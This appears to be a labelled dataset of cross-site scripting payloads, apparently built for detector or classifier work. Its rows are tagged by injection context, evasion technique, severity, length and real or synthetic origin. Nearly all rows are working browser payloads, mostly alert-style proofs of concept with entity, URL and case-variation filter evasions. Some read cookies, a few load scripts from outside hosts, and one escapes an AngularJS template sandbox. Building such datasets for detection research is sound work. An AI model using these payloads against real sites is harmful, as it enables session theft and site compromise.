payload,context,technique,severity,length,source
"<cite draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,86,real
<rp onpointerover=alert(1) style=display:block>AnonKryptiQuz</rp>,event_handler,none,medium,65,real
<image onpointerleave=alert(1) style=display:block>AnonKryptiQuz</image>,event_handler,none,medium,72,real
<svg onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,57,synthetic
<svG oNfoCus=coNsoLe.Log(loCatIon.haSh)/>,tag_injection,synthetic,medium,41,synthetic
"<abbr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,68,real
"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",script_injection,none,high,199,real
' onerror=prompt(1) ',attribute_escape,synthetic,medium,21,synthetic
<button onpointerenter=alert(1) style=display:block>AnonKryptiQuz</button>,event_handler,none,medium,74,real
"<a draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</a>",event_handler,none,medium,60,real
"""`'><script>\x0Bjavascript:alert(0186)</script>",script_injection,none,medium,47,real
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></label>",event_handler,none,medium,114,real
';alert(document.domain)//,dom_sink,none,medium,26,real
<SCRI<script>PT>alert(1);</SCR</script>IPT>,script_injection,case_variation,medium,43,real
%3Csvg ontoggle=prompt(document.cookie)%3E,tag_injection,synthetic,medium,42,synthetic
"<header draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</header>",event_handler,none,medium,90,real
javascript&#58;alert(1),generic,html_entity,medium,23,real
"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",event_handler,none,medium,166,real
"<bdi ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</bdi>",event_handler,none,medium,87,real
"<command onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</command>",event_handler,none,medium,75,real
<dl onpointerover=alert(1) style=display:block>AnonKryptiQuz</dl>,event_handler,none,medium,65,real
"""><Svg onTogGle=coNfiRm('XSS')>",tag_injection,synthetic,medium,31,synthetic
<embed onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<track onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</track>",event_handler,none,medium,63,real
"""><script+src=""https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679""></script>",script_injection,url_encoding,medium,213,real
%22 onbegin=prompt(location.hash) %22,attribute_escape,synthetic,medium,37,synthetic
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,event_handler,none,medium,77,real
<script onmousewheel=alert(1) style=display:block>requires scrolling,script_injection,none,medium,68,real
j&#97;v&#97;script:void(consol&#101;.log('XSS')),js_uri,synthetic,medium,48,synthetic
""" onclick=confirm(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,50,synthetic
<script>alert(1)</script>.aspx,script_injection,none,medium,30,real
"<style onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,71,real
j&#97;v&#97;script:&#97;l&#101;rt(1),js_uri,synthetic,medium,36,synthetic
"<tr onmouseleave=""alert(1)"">AnonKryptiQuz</tr>",event_handler,none,medium,46,real
"%3F%20""><img src=x onerror=prompt(document.domain);>",event_handler,url_encoding,medium,52,real
"""\""><script>'confirm(0)%3B<%2Fscript>"",",script_injection,url_encoding,medium,39,real
<svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,50,synthetic
<acronym onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</acronym>,event_handler,none,medium,80,real
Case: `<script> var new something = '$input'; </script>,script_injection,none,low,55,real
%22 onmouseenter=alert(location.hash) %22,attribute_escape,synthetic,medium,41,synthetic
"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable style=display:block>drop here</style>",event_handler,none,medium,127,real
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",event_handler,none,medium,113,real
"""><svg onlo&#97;d=prompt('XSS')>",tag_injection,synthetic,medium,32,synthetic
"<button formaction=""javascript:alert('AnonKryptiQuz')"">Click me</button>",js_uri,none,medium,72,real
<audio onpointerleave=alert(1) style=display:block>AnonKryptiQuz</audio>,event_handler,none,medium,72,real
"<dt onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dt>",event_handler,none,medium,277,real
"<kbd onmouseenter=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,48,real
>><marquee loop=1 width=0 onfinish=alert(1)>,event_handler,none,medium,44,real
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",event_handler,none,medium,99,real
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",event_handler,none,medium,95,real
j&#97;vascript:prompt(%27XSS%27),js_uri,synthetic,medium,32,synthetic
"""><img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,56,synthetic
dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi,generic,url_encoding,medium,56,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",event_handler,none,medium,182,real
""" oNbeGin=prOmpT(1) """,attribute_escape,synthetic,medium,21,synthetic
<noscript onpointerdown=alert(1) style=display:block>AnonKryptiQuz</noscript>,event_handler,none,medium,77,real
"<TABLE BACKGROUND=""javascript:alert('AnonKryptiQuz')"">",js_uri,case_variation,medium,54,real
<tt onpointerdown=alert(1) style=display:block>AnonKryptiQuz</tt>,event_handler,none,medium,65,real
"<label onmouseover=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,51,real
<button popovertarget=x>Click me</button><script onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</script>,script_injection,none,medium,108,real
<button popovertarget=x>Click me</button><figcaption onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</figcaption>,event_handler,none,medium,116,real
%3Csvg ontoggle=alert(location.hash)%3E,tag_injection,synthetic,medium,39,synthetic
<script>//console.log(location.hash)</script>,script_injection,synthetic,medium,45,synthetic
"<video onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</video>",event_handler,none,medium,63,real
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",event_handler,none,medium,119,real
"<noembed onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,89,real
%3Csvg onclick=confirm('XSS')%3E,tag_injection,synthetic,medium,32,synthetic
<svg onclick=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,53,synthetic
&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;,generic,html_entity,low,191,real
"<rp oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=print()></picture>",event_handler,none,low,116,real
"<base draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,66,real
"<frameset onmousemove=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,57,real
<BODY ONLOAD=alert(8839)>,event_handler,case_variation,medium,25,real
""" onfocus=alert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,48,synthetic
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",event_handler,none,medium,109,real
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,59,synthetic
&amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;,generic,none,medium,101,real
"<image onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,71,real
"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable style=display:block>drop here</details>",event_handler,none,medium,131,real
JavAscRipT:cOnsOle.loG(lOcaTioN.hAsh),js_uri,synthetic,medium,37,synthetic
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,56,real
"onload=""alert(1)""",event_handler,none,medium,17,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""print()""></sup>",event_handler,none,low,175,real
<del onpointerdown=alert(1) style=display:block>AnonKryptiQuz</del>,event_handler,none,medium,67,real
"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,81,real
%27 ontoggle=console.log(location.hash) %27,attribute_escape,synthetic,medium,43,synthetic
"<noembed oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",event_handler,none,medium,66,real
"'\u0029\u0028};alert(document.cookie);//""",dom_sink,unicode_escape,high,41,real
<svg onload=confirm()>,event_handler,none,medium,22,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(docum&#101;nt.dom&#97;in)>"")",dom_sink,synthetic,medium,86,synthetic
<hgroup onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</hgroup><input value=clickme>,event_handler,none,medium,103,real
"<abbr onmousedown=""alert(1)"">AnonKryptiQuz</abbr>",event_handler,none,medium,49,real
"""%3E%3Csvg ontoggle=confirm(1)%3E",tag_injection,synthetic,medium,33,synthetic
""" onb&#101;gin=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,63,synthetic
""" onload=console.log('XSS') """,attribute_escape,synthetic,medium,29,synthetic
;prompt(1)//”;prompt(2)//”;prompt(3)//–></SCRIPT>”>’><SCRIPT>prompt(4)</SCRIPT>,script_injection,case_variation,medium,79,real
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",event_handler,none,medium,101,real
"javascr	ipt:confirm(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,50,synthetic
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,event_handler,none,medium,77,real
"<tbody onmouseleave=""alert(1)"">AnonKryptiQuz</tbody>",event_handler,none,medium,52,real
%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E,event_handler,url_encoding,medium,58,real
"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;",generic,none,medium,54,real
<svg onmouseenter=alert(location.hash)>,tag_injection,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",event_handler,none,medium,91,real
"<colgroup oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,79,real
<aside onpointerover=alert(1) style=display:block>AnonKryptiQuz</aside>,event_handler,none,medium,71,real
"""><svg onclick=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,46,synthetic
<svg onclick=prompt(document.cookie)>,tag_injection,synthetic,medium,37,synthetic
"<meta ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,89,real
"<tfoot oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",event_handler,none,medium,62,real
%3Csvg onmouseenter=prompt(location.hash)%3E,tag_injection,synthetic,medium,44,synthetic
"""><svg onbegin=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
<noframes id=x tabindex=1 onactivate=alert(1)></noframes>,event_handler,none,medium,57,real
"""%3E%3Csvg onload=confirm(document.domain)%3E",tag_injection,synthetic,medium,45,synthetic
<script>confirm`docum&#101;nt.dom&#97;in`</script>,script_injection,synthetic,medium,50,synthetic
"<dd oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",event_handler,none,medium,56,real
"<multicol onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,77,real
<tbody onpointerleave=alert(1) style=display:block>AnonKryptiQuz</tbody>,event_handler,none,medium,72,real
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;9421&#41;&#47;&#47;"">XYZ</a",event_handler,html_entity,low,88,real
<script>({0:#0=alert/#0#/#0#(123)})</script>,script_injection,none,low,44,real
%22 onload=prompt(1) %22,attribute_escape,synthetic,medium,24,synthetic
"<footer onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,85,real
"<fieldset draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,74,real
%3Csvg onclick=alert(document.cookie)%3E,tag_injection,synthetic,medium,40,synthetic
"<iframe draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",event_handler,none,medium,88,real
<element onpointerup=alert(1) style=display:block>AnonKryptiQuz</element>,event_handler,none,medium,73,real
"<noembed onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",event_handler,none,medium,67,real
<svg ontoggle=confirm(document.domain)/>,tag_injection,synthetic,medium,40,synthetic
<script>alert(1)</script>,script_injection,none,medium,25,real
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,event_handler,none,medium,48,real
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,event_handler,none,medium,49,real
<scRipT>/*/cOnfIrm('XSS')</ScrIpt>,script_injection,synthetic,medium,34,synthetic
""">Enter_Mouse_Pointer_Here_to_get_AnonKryptiQuz<P/onpointerenter=""alert(1)""><<""",event_handler,case_variation,medium,79,real
<svg/onload​=alert//&NewLine;(2)>,tag_injection,none,low,33,real
"<html onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,70,real
"<optgroup onmouseenter=""alert(1)"">AnonKryptiQuz</optgroup>",event_handler,none,medium,58,real
<svg onclick=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,33,synthetic
"<body draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</body>",event_handler,none,medium,84,real
<picture onpointerup=alert(1) style=display:block>AnonKryptiQuz</picture>,event_handler,none,medium,73,real
<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>,event_handler,none,medium,73,real
"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",event_handler,none,medium,55,real
"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></input4>",event_handler,none,medium,105,real
"%3Csvg onfocus=alert(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,55,synthetic
"<svg draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,79,real
"<nextid onmouseout=""alert(1)"">AnonKryptiQuz</nextid>",event_handler,none,medium,52,real
"<li draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,80,real
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,event_handler,none,medium,64,real
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable style=display:block>drop here</td>",event_handler,none,medium,121,real
<param onpointerover=alert(1) style=display:block>AnonKryptiQuz</param>,event_handler,none,medium,71,real
%253Cscript%253Ealert('AnonKryptiQuz')%253C/script%253E,generic,url_encoding,medium,55,real
"<br onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,79,real
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(3087)""></html onMouseEnter>",event_handler,none,medium,100,real
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=print()></textarea>",event_handler,none,low,133,real
<svg onload=confirm(%27XSS%27)>,tag_injection,synthetic,medium,31,synthetic
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></ol>",event_handler,none,medium,108,real
"onmouseover=""document.cookie=true;"">//INJECTX",event_handler,none,high,45,real
<svG oNtoGglE=aLerT('XSS')/>,tag_injection,synthetic,medium,28,synthetic
<svg onload=&#97&#108&#101&#114&#116(1)>,event_handler,html_entity,low,40,real
"<b onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</b>",event_handler,none,medium,61,real
"<animatetransform onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,93,real
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",script_injection,none,medium,62,real
"<image onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,69,real
<isindex type=image onload=alert(1) src=validimage.png>,event_handler,none,medium,55,real
"<img/src/onerror=""window[`al+/e/[`ex + `ec`]`e`+`rt`](2)"">",event_handler,none,low,58,real
3Cscript%3Ealert(1)%3C%2Fscript%3E,generic,url_encoding,medium,34,real
"<<SCRIPT>alert(""AnonKryptiQuz"");//<</SCRIPT>",script_injection,case_variation,medium,44,real
<dd onpointerup=alert(1) style=display:block>AnonKryptiQuz</dd>,event_handler,none,medium,63,real
%27%3E%27%3E%22%3E%script%3Ealert(2);%3C/script%3E,generic,url_encoding,medium,50,real
"<span draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</span>",event_handler,none,medium,66,real
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,script_injection,none,low,54,real
j&#97;v&#97;script:prompt('XSS'),js_uri,synthetic,medium,32,synthetic
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",script_injection,case_variation,low,51,real
<img onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"""><svg onbegin=console.log(location.hash)>",tag_injection,synthetic,medium,42,synthetic
"<rtc draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,83,real
<svg><map onload=alert(1)></map>,event_handler,none,medium,32,real
"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",event_handler,none,medium,55,real
"<content onmousedown=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,55,real
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",script_injection,comment_injection,medium,76,real
"<style>:target {color: red;}</style><img2 id=x style=""transition:color 10s"" ontransitioncancel=print()></img2>",event_handler,none,low,110,real
"""%3E%3Csvg onmouseenter=prompt(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,75,real
"<meter onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",event_handler,none,medium,71,real
<svg onload=prompt(%27XSS%27)>,tag_injection,synthetic,medium,30,synthetic
"<image2 onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,74,real
<blockquote onpointerover=alert(1) style=display:block>AnonKryptiQuz</blockquote>,event_handler,none,medium,81,real
<main id=x tabindex=1 onbeforeactivate=alert(1)></main>,event_handler,none,medium,55,real
"<map onmouseenter=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,48,real
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<!--[if gte IE 4]><SCRIPT>javascript:alert(8303);</SCRIPT><![endif]-->,script_injection,comment_injection|case_variation,medium,70,real
"<IMG SRC=javascript:alert(""AnonKryptiQuz"")>",js_uri,case_variation,medium,43,real
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",event_handler,none,medium,108,real
"""><Svg onCliCk=AleRt(LocAtiOn.HasH)>",tag_injection,synthetic,medium,36,synthetic
<svg ontoggl&#101;=prompt(1)>,tag_injection,synthetic,medium,29,synthetic
<button popovertarget=x>Click me</button><summary ontoggle=alert(1) popover id=x>AnonKryptiQuz</summary>,event_handler,none,medium,104,real
<blink contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
"<label onclick=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,47,real
"<rt onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,66,real
<iframe2 onpointermove=alert(1) style=display:block>AnonKryptiQuz</iframe2>,event_handler,none,medium,75,real
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationend=""alert(1)""></svg>",event_handler,none,medium,91,real
%3Csvg onmouseenter=confirm(location.hash)%3E,tag_injection,synthetic,medium,45,synthetic
"<rp onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",event_handler,none,medium,65,real
"<h1 onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",event_handler,none,medium,60,real
""" onfocus=console.log(document.cookie) autofocus=""",attribute_escape,synthetic,medium,50,synthetic
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,event_handler,none,medium,69,real
<strike contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
%3Csvg onerror=alert(document.domain)/%3E,tag_injection,synthetic,medium,41,synthetic
"<spacer draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,68,real
' onclick=\u0061lert(1) ',attribute_escape,synthetic,medium,25,synthetic
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},template_injection,encoding,high,65,real
"<meta oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,71,real
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionend=alert(1)></tfoot>",event_handler,none,medium,108,real
' onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,74,synthetic
"<frameset draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,74,real
"<style>@keyframes x{}</style><p style=""animation-name:x"" onwebkitanimationend=""alert(1)""></p>",event_handler,none,medium,93,real
%27 onerror=confirm(1) %27,attribute_escape,synthetic,medium,26,synthetic
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,event_handler,none,medium,61,real
"<scRipT>aLerT`STriNg.FroMChArCOde(88,83,83)`</scRipT>",script_injection,synthetic,medium,53,synthetic
<frame onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</frame><input value=clickme>,event_handler,none,medium,110,real
<svg onload=console.log(document.domain)>,tag_injection,synthetic,medium,41,synthetic
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>,event_handler,none,medium,71,real
style=xss:expression(alert(1)),generic,none,medium,30,real
"<var draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,79,real
"<iframe onmouseleave=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,54,real
' onmous&#101;ov&#101;r=confirm('XSS') ',attribute_escape,synthetic,medium,40,synthetic
' oNbeGin=alErt(1) ',attribute_escape,synthetic,medium,20,synthetic
javascript:confirm(document.cookie),js_uri,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tfoot>",event_handler,none,medium,114,real
"<fieldset onmouseout=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,56,real
"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",event_handler,none,medium,109,real
"<slot onclick=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,65,real
%3Csvg onfocus=alert(location.hash)/%3E,tag_injection,synthetic,medium,39,synthetic
<script>\u0061lert`location.hash`</script>,script_injection,synthetic,medium,42,synthetic
"<frame onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,85,real
' onmous&#101;&#101;nt&#101;r=consol&#101;.log(1) ',attribute_escape,synthetic,medium,51,synthetic
"""><svg onload=prompt(document.domain);>.php",event_handler,none,medium,43,real
<svg><abbr onload=alert(1)></abbr>,event_handler,none,medium,34,real
javascr	ipt:prompt('XSS'),js_uri,synthetic,medium,25,synthetic
"<tfoot onmouseover=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,51,real
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,event_handler,html_entity,medium,174,real
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",js_uri,none,medium,63,real
